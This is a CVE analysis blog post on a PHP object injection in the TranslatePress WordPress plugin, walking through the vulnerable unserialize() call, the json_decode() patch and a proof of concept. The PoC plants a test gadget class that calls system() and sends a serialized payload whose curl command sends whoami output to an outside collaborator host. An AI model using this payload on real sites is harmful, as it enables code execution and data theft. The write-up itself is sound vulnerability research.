---
title: CVE-2025-30773 Analysis & POC
description: Security Vulnerability in WordPress TranslatePress Plugin.
date: 2025-11-23 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, php object injection]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
    auto: false
---

<!--more-->

## CVE & Basic Info

The vulnerability is a Deserialization of Untrusted Data issue in Cozmoslabs TranslatePress, which allows for Object Injection. This issue affects TranslatePress from n/a up to version 2.9.6.

* **CVE ID**: [CVE-2025-30773](https://www.cve.org/CVERecord?id=CVE-2025-30773)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 2.9.6
* **Patched Versions**: 2.9.7
* **CVSS severity**: High (7.2)
* **Required Privilege**: Administrator
* **Product**: [WordPress TranslatePress Plugin](https://wordpress.org/plugins/translatepress-multilingual/)

## Requirements

* **Local WordPress & Debugging**

  * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
  * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** – **TranslatePress**:

  * `2.9.6` – **vulnerable**
  * `2.9.7` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any other diff tool.

## Cause

**In the vulnerable version (v2.9.6):**

```php {title="class-upgrade.php v2.9.6" data-open=true hl_lines=[11]}
public function trp_update_database(){
    if ( ! current_user_can( apply_filters('trp_update_database_capability', 'manage_options') ) ){
        $this->stop_and_print_error( __('Update aborted! Your user account doesn\'t have the capability to perform database updates.', 'translatepress-multilingual' ) );
    }

    $nonce = isset( $_REQUEST['trp_updb_nonce'] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST['trp_updb_nonce'] ), 'tpupdatedatabase' ) : false;
    if ( $nonce === false ){
        $this->stop_and_print_error( __('Update aborted! Invalid nonce.', 'translatepress-multilingual' ) );
    }
    ...
    $extra_params = isset( $_REQUEST['trp_updb_extra_params'] ) ? unserialize(base64_decode(sanitize_text_field($_REQUEST['trp_updb_extra_params'] ))) : array();
    ...
}
```

Here, **`unserialize()`** is called directly on user-supplied data (`$_REQUEST['trp_updb_extra_params']` after HTML sanitization and Base64 decode). This creates a serious vulnerability:

* **Object Injection risk**: If an attacker provides a PHP object payload encoded in Base64, the decode + unserialize process can initialize a malicious object, leading to **Object Injection** and potentially **Remote Code Execution (RCE)**.
* **No safety validation**: There is no data validation prior to calling `unserialize()`.
* **No fallback mechanism**: If data is invalid or malicious, the system lacks graceful handling, increasing risk.

**Patch (v2.9.7):**

![Diff](diff.png "Patch changes")

`unserialize()` is replaced with `json_decode()`:

By removing `unserialize()`, the vulnerability surface is eliminated entirely.

## Analysis

The `trp_update_database()` function checks whether the current user is an Administrator via:

```php
if ( ! current_user_can( apply_filters('trp_update_database_capability', 'manage_options') ) ){
    $this->stop_and_print_error( __('Update aborted! Your user account doesn\'t have the capability to perform database updates.', 'translatepress-multilingual' ) );
}
```

It also verifies a `nonce` to prevent CSRF:

```php
$nonce = isset( $_REQUEST['trp_updb_nonce'] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST['trp_updb_nonce'] ), 'tpupdatedatabase' ) : false;
if ( $nonce === false ){
    $this->stop_and_print_error( __('Update aborted! Invalid nonce.', 'translatepress-multilingual' ) );
}
```

If `nonce` is missing, the vulnerability can be exploited unauthenticated by tricking an admin into visiting an attacker-controlled page. The browser will send the request with admin cookies, `manage_options` will pass, and backend logic proceeds.

Searching for the `trp_update_database` function:

![Search](search.png "Search result for trp_update_database")

`trp_update_database` is assigned to the `page` parameter, meaning it is the callback invoked when visiting `/wp-admin/admin.php?page=trp_update_database`.

## Flow

{{< mermaid >}}
graph TD

A["Administrator visits /wp-admin/admin.php?page=trp_update_database"] --> B["trp_update_database() invoked"]

B --> C{"Check capability: current_user_can(manage_options)"}
C -->|Fail| X["Stop & print error: insufficient privilege"]
C -->|Pass| D["Verify nonce: wp_verify_nonce()"]

D -->|Fail| Y["Stop & print error: Invalid nonce"]
D -->|Pass| E["Read trp_updb_extra_params"]

E --> F["base64_decode()"]
F --> G["unserialize()"]

G --> H{"Is payload malicious?"}
H -->|Yes| R["Object Injection → Code Execution (RCE)"]
H -->|No| S["Continue update process normally"]

{{< /mermaid >}}

## Proof of Concept (PoC)

1. Create test class in `wp-config.php`

```php
class Evil
{
    public $command = "ls /";
    public function __destruct()
    {
        die(system($this->command));
    }
}
```

2. Send request through BurpSuite proxy
3. Resend the request with `trp_updb_extra_params` containing a serialized Base64-encoded payload

```php
trp_updb_extra_params = base64_encode('O:4:"Evil":1:{s:7:"command";s:75:"curl http://p8ye6bo0snakjfntwfcv7zvcz35utkh9.oastify.com/?leadked=$(whoami)";}')
```

```HTTP
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Cookie: administrator_cookie
...

action=trp_update_database&trp_updb_nonce=808dff22f9&initiate_update=true&trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NzU6ImN1cmwgaHR0cDovL3A4eWU2Ym8wc25ha2pmbnR3ZmN2N3p2Y3ozNXV0a2g5Lm9hc3RpZnkuY29tLz9sZWFka2VkPSQod2hvYW1pKSI7fQ==
```

![Result](result.png "Output")

# Conclusion

The vulnerability originates from directly using `unserialize()` on user-controlled input without additional validation, enabling arbitrary object instantiation and potential remote code execution if a crafted payload is supplied. Combined with CSRF, an attacker could trick an admin into executing the payload silently. Switching to `json_decode()` in version 2.9.7 removes the attack surface entirely and properly resolves the issue.

# Key Takeaways

* `unserialize()` on untrusted input always carries Object Injection and RCE risks.
* User input must be validated and sanitized before processing.
* CSRF can escalate an “authenticated exploit” into a “silent exploitation” scenario.
* `json_decode()` is a safer choice for structured data exchange.
* Comparing code differences between vulnerable and patched versions helps quickly identify root causes and solutions.

## References

[Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[WordPress TranslatePress Plugin <= 2.9.6 is vulnerable to PHP Object Injection](https://patchstack.com/database/wordpress/plugin/translatepress-multilingual/vulnerability/wordpress-translatepress-2-9-6-php-object-injection-vulnerability)
